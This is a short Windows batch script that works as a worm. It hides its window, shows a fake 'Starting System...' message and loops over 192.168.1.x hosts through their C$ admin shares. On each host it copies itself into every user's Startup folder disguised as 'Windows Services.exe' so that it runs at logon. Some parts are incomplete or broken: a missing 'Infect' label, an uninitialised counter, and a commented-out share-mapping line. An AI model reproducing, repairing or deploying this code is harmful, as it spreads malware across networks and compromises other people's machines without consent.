@echo off
mode con: cols=20 lines=1
cd %systemroot%
echo Starting System... 


REM net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)


timeout /t 0.80 /nobreak > nul
exit
